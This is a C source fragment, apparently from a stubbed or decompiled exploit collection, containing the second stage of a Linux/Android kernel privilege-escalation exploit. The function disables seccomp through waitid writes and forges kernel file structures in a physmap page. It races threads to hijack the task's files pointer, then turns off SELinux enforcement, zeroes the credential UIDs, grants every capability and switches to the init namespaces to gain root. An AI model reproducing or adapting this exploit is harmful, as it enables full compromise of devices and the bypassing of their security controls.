
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct PagePair {unsigned long userland_page; int kernel_page; } ;
typedef int pthread_t ;
typedef int buf ;


 scalar_t__ CRED_CAP_OFF ;
 int CRED_CAP_SIZE ;
 int CRED_ID_SIZE ;
 scalar_t__ CRED_NS_OFF ;
 scalar_t__ CRED_UID_OFF ;
 unsigned int FMODE_LSEEK ;
 unsigned long INIT_FS ;
 unsigned long INIT_USER_NS ;
 unsigned long OFFSET_OF_CRED_SECURITY ;
 unsigned long OFFSET_OF_FILES ;
 unsigned long OFFSET_OF_FS ;
 scalar_t__ OFFSET_OF_FS_COUNT ;
 scalar_t__ OFFSET_OF_F_COUNT ;
 scalar_t__ OFFSET_OF_F_INODE ;
 scalar_t__ OFFSET_OF_F_SECURITY ;
 scalar_t__ OFFSET_OF_IFLAGS ;
 unsigned long OFFSET_OF_NSPROXY ;
 scalar_t__ OFFSET_OF_NS_COUNT ;
 unsigned long OFFSET_OF_PARENT ;
 scalar_t__ OFFSET_OF_SECCOMP ;
 scalar_t__ OFFSET_OF_SECCOMP_MODE ;
 unsigned long OFFSET_OF_SIGNAL ;
 unsigned long OFFSET_OF_TASK_CRED ;
 scalar_t__ OFFSET_OF_TASK_USAGE ;
 unsigned long OFFSET_OF_THREAD_GROUP ;
 int O_RDONLY ;
 int P_ALL ;
 scalar_t__ SELINUX_ENFORCING_OFF ;
 int SYS_waitid ;
 int WEXITED ;
 scalar_t__ done_overwrite ;
 int done_rooting ;
 int errno ;
 int exit (int) ;
 unsigned long* f_op ;
 int fork () ;
 int get_physmap (struct PagePair*) ;
 unsigned long kernel_base ;
 int mem_write (scalar_t__,...) ;
 int memset (char*,int,int) ;
 int open (char*,int ) ;
 int printf (char*) ;
 scalar_t__ pthread_create (int *,int *,int ,long*) ;
 unsigned long read_addr (unsigned long) ;
 int sleep (int) ;
 int syscall (int ,int ,int ,scalar_t__,int ,int *) ;
 int thread_to_be_root ;
 int usleep (int) ;
 int write_5_thread ;
 int write_addr (unsigned long,unsigned long) ;
 int write_addr4 (scalar_t__,int) ;

void do_exploit_2(unsigned long task_addr) {






  usleep(100000);


  syscall(SYS_waitid, P_ALL, 0, task_addr + OFFSET_OF_SECCOMP-4, WEXITED, ((void*)0));
  syscall(SYS_waitid, P_ALL, 0, task_addr + OFFSET_OF_SECCOMP_MODE, WEXITED, ((void*)0));

  int pid = fork();
  int rand_fd = open("/dev/random", O_RDONLY);

  if (errno == 1) {
    printf("SECCOMP NOT ACTUALLY GONE!\n");
    exit(-1);
  }
  if (!pid) {
    exit(0);
  }

  printf("part 2 start\n");

  struct PagePair pp;
  get_physmap(&pp);



  memset((void*)pp.userland_page, 0x41, 0x1000);
  unsigned long files_struct = pp.userland_page;
  *(int*)files_struct = 100;
  *(unsigned long*)(files_struct+32) = pp.kernel_page+0x100;


  unsigned long fdt = pp.userland_page+0x100;
  *(int*)fdt = 2;
  *(unsigned long*)(fdt+8) = pp.kernel_page+0x200;


  unsigned long fdarr = pp.userland_page+0x200;
  *(unsigned long*)fdarr = pp.kernel_page+0x300;


  unsigned long file = pp.userland_page+0x300;
  *(unsigned long*)(file+40) = pp.kernel_page+0x400;
  *(unsigned int*)(file+68) = FMODE_LSEEK;
  *(unsigned long*)(file+OFFSET_OF_F_COUNT)=100;

  f_op = (unsigned long*)(pp.userland_page+0x400);



  *(unsigned long*)(file+OFFSET_OF_F_INODE)=pp.kernel_page+0x500;
  unsigned long inode = (unsigned long)(pp.userland_page+0x500);
  *(unsigned int*)(inode+OFFSET_OF_IFLAGS) = 0x200;



  printf("here we go\n");
  done_overwrite=0;
  long aa[2];
  aa[0] = task_addr + OFFSET_OF_FILES;
  aa[1] = pp.kernel_page;
  pthread_t th1;

  done_rooting = 0;
  if(pthread_create(&th1, ((void*)0), thread_to_be_root, ((void*)0))) {
    printf("pthread failed\n");
    exit(-1);
  }



  if(pthread_create(&th1, ((void*)0), write_5_thread, aa)) {
    printf("pthread failed\n");
    exit(-1);
  }


  while(!done_overwrite) {
  }







  unsigned long parent_addr = read_addr(task_addr+OFFSET_OF_PARENT);


  unsigned long cred = read_addr(task_addr + OFFSET_OF_TASK_CRED);
  unsigned long security = read_addr(cred + OFFSET_OF_CRED_SECURITY);


  *(unsigned long*)(file+OFFSET_OF_F_SECURITY) = security;





  long parent_nsproxy = read_addr(parent_addr+OFFSET_OF_NSPROXY);
  write_addr(task_addr+OFFSET_OF_NSPROXY, parent_nsproxy);
  write_addr4(parent_nsproxy+OFFSET_OF_NS_COUNT, 0x11111111);


  long parent_fs = read_addr(parent_addr+OFFSET_OF_FS);
  write_addr(task_addr+OFFSET_OF_FS, parent_fs);
  write_addr4(parent_fs+OFFSET_OF_FS_COUNT, 0x11111111);


  write_addr4(task_addr+OFFSET_OF_TASK_USAGE, 0x11111);



  write_addr4(kernel_base+SELINUX_ENFORCING_OFF, 0);

  unsigned long thread2 = read_addr(task_addr+OFFSET_OF_THREAD_GROUP)-OFFSET_OF_THREAD_GROUP;
  if (thread2 == task_addr) {
    thread2 = read_addr(task_addr+OFFSET_OF_THREAD_GROUP+8)-OFFSET_OF_THREAD_GROUP;
  }

  unsigned long signal = read_addr(thread2+OFFSET_OF_SIGNAL);
  write_addr(task_addr+OFFSET_OF_SIGNAL, signal);



  char buf[100];
  memset(buf, 0, sizeof(buf));
  mem_write(cred+CRED_UID_OFF, buf, CRED_ID_SIZE);
  memset(buf, 0xff, sizeof(buf));
  mem_write(cred+CRED_CAP_OFF, buf, CRED_CAP_SIZE);
  unsigned long init_ns = INIT_USER_NS+kernel_base;
  mem_write(cred+CRED_NS_OFF, &init_ns, 8);


  unsigned long init_fs = INIT_FS+kernel_base;
  write_addr(thread2+OFFSET_OF_FS, init_fs);


  done_rooting = 1;
  sleep(1000000);

}
